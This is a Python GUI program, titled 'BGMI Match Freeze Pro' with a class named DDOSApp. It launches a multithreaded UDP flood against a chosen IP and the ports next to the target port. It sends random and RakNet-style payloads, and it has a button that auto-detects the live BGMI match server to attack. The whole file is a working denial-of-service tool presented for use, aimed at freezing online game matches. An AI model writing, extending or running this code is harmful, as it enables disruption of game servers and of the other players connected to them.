import socket
import random
import threading
import time
import customtkinter as ctk
from tkinter import messagebox

# Configuration for CustomTkinter
ctk.set_appearance_mode("dark")  # Modes: "System" (standard), "Dark", "Light"
ctk.set_default_color_theme("blue")  # Themes: "blue" (standard), "green", "dark-blue"

class DDOSApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("BGMI Match Server Stresser Pro")
        self.geometry("440x560")
        self.attributes("-topmost", True)  # Floating / Always on top
        
        self.is_running = False
        self.threads = []
        self.packets_sent = 0
        self.bytes_sent = 0
        self._lock = threading.Lock()
        
        # UI Elements
        self.title_label = ctk.CTkLabel(self, text="BGMI MATCH FREEZE PRO", font=ctk.CTkFont(size=22, weight="bold"))
        self.title_label.pack(pady=15)
        
        self.ip_entry = ctk.CTkEntry(self, placeholder_text="Target IP Address (e.g. 1.1.1.1)", width=280)
        self.ip_entry.pack(pady=6)
        
        self.port_entry = ctk.CTkEntry(self, placeholder_text="Target Port (e.g. 17000)", width=280)
        self.port_entry.pack(pady=6)
        
        self.auto_find_btn = ctk.CTkButton(self, text="⚡ AUTO FIND IP & PORT", fg_color="#E67E22", hover_color="#D35400", font=ctk.CTkFont(weight="bold"), command=self.auto_find_ip_port)
        self.auto_find_btn.pack(pady=6)
        
        self.threads_entry = ctk.CTkEntry(self, placeholder_text="Threads (default: 150)", width=280)
        self.threads_entry.pack(pady=6)
        
        self.time_entry = ctk.CTkEntry(self, placeholder_text="Duration in seconds (e.g. 120)", width=280)
        self.time_entry.pack(pady=6)
        
        self.start_button = ctk.CTkButton(self, text="START ATTACK", fg_color="red", hover_color="darkred", font=ctk.CTkFont(weight="bold"), command=self.toggle_attack)
        self.start_button.pack(pady=12)
        
        self.status_label = ctk.CTkLabel(self, text="Status: IDLE", text_color="gray", font=ctk.CTkFont(weight="bold"))
        self.status_label.pack(pady=5)
        
        self.log_textbox = ctk.CTkTextbox(self, width=380, height=140, state="disabled")
        self.log_textbox.pack(pady=10)
        
    def auto_find_ip_port(self):
        try:
            from auto_finder import find_bgmi_ip_port
            ip, port, msg = find_bgmi_ip_port()
            if ip and port:
                self.ip_entry.delete(0, "end")
                self.ip_entry.insert(0, str(ip))
                self.port_entry.delete(0, "end")
                self.port_entry.insert(0, str(port))
                self.log(f"🎯 {msg}")
            else:
                messagebox.showwarning("Auto Find", msg)
        except Exception as e:
            messagebox.showerror("Auto Find Error", f"Failed to detect: {e}")

    def log(self, message):
        self.log_textbox.configure(state="normal")
        self.log_textbox.insert("end", message + "\n")
        self.log_textbox.see("end")
        self.log_textbox.configure(state="disabled")

    def attack_thread(self, ip, port, duration):
        stop_time = time.time() + duration
        raknet_magic = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
        payload_pool = [
            b"\x01\x00\x00\x00\x09" + raknet_magic + random._urandom(120),
            b"\x04\x00\x00\x00\x00\x01\x00\x00" + random._urandom(500),
            b"\x02\x00\x00\x00" + random._urandom(1000),
            b"\xff\xff\xff\xff\x55\x53" + random._urandom(1380),
            random._urandom(1420),
            random._urandom(256),
        ]
        payload_sizes = [len(p) for p in payload_pool]
        num_payloads = len(payload_pool)

        target_ports = [
            port,
            port + 1,
            port - 1,
            port + 2 if port + 2 < 65535 else port
        ]
        num_ports = len(target_ports)

        local_pkts = 0
        local_bytes = 0
        idx = 0

        while self.is_running and time.time() < stop_time:
            sockets = []
            for _ in range(3):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    try:
                        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
                    except Exception:
                        pass
                    sockets.append(s)
                except Exception:
                    pass

            if not sockets:
                try:
                    sockets = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]
                except Exception:
                    time.sleep(0.01)
                    continue

            num_sockets = len(sockets)

            for _ in range(500):
                if not self.is_running:
                    break
                try:
                    current_sock = sockets[idx % num_sockets]
                    p_idx = idx % num_payloads
                    payload = payload_pool[p_idx]
                    size = payload_sizes[p_idx]
                    target = (ip, target_ports[idx % num_ports])

                    current_sock.sendto(payload, target)
                    local_pkts += 1
                    local_bytes += size
                    idx += 1
                except Exception:
                    pass

            for s in sockets:
                try:
                    s.close()
                except Exception:
                    pass

        with self._lock:
            self.packets_sent += local_pkts
            self.bytes_sent += local_bytes

    def stop_attack(self):
        self.is_running = False
        self.start_button.configure(text="START ATTACK", fg_color="red", hover_color="darkred")
        self.status_label.configure(text="Status: STOPPED", text_color="red")
        mb = round(self.bytes_sent / (1024 * 1024), 2)
        self.log(f"🛑 Attack stopped. Sent {self.packets_sent:,} packets ({mb} MB).")

    def toggle_attack(self):
        if self.is_running:
            self.stop_attack()
        else:
            self.start_attack()

    def start_attack(self):
        ip = self.ip_entry.get().strip()
        port = self.port_entry.get().strip()
        threads = self.threads_entry.get().strip()
        duration_str = self.time_entry.get().strip()
        
        if not ip or not port or not duration_str:
            messagebox.showerror("Error", "Please fill Target IP, Port, and Duration.")
            return
            
        try:
            port = int(port)
            duration = int(duration_str)
            num_threads = int(threads) if threads else 150
        except ValueError:
            messagebox.showerror("Error", "Port, threads, and duration must be integers.")
            return
            
        self.is_running = True
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_button.configure(text="STOP ATTACK", fg_color="green", hover_color="darkgreen")
        self.status_label.configure(text=f"Status: ATTACKING {ip}:{port}", text_color="green")
        self.log(f"🚀 Launching match stress on {ip}:{port} | Threads: {num_threads} | Duration: {duration}s")
        
        self.threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.attack_thread, args=(ip, port, duration))
            t.daemon = True
            t.start()
            self.threads.append(t)
            
        # Schedule auto stop
        self.after(duration * 1000, self.auto_stop, duration)

    def auto_stop(self, duration):
        if self.is_running:
            self.stop_attack()

if __name__ == "__main__":
    app = DDOSApp()
    app.mainloop()
